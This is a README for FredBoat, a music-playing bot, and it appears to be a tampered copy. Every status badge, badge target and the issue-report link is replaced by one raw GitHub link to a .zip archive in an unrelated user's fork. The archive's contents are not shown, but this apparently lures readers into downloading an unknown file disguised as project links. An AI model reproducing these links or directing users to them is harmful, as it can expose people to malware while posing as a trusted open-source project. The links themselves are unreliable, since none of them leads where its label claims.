# FredBoat [![TeamCity (simple build status)](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip)](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip) [![Github commits (since latest release)](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip)]() [![Crowdin](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip)](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip) [![Open Source Helpers](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip)](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip) [![Twitter Follow](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip)]()
FredBoat is a bot that has various features, but most notably is that it can play music. Pull requests are welcome and please report any issues you find in [issues](https://raw.githubusercontent.com/ahmmedaya94/FredBoat/dev/Glauconia/FredBoat.zip).

FredBoat is licensed under the MIT license, so feel free to copy small or large parts of the code here without having to ask. I would love to see what you can create with it!
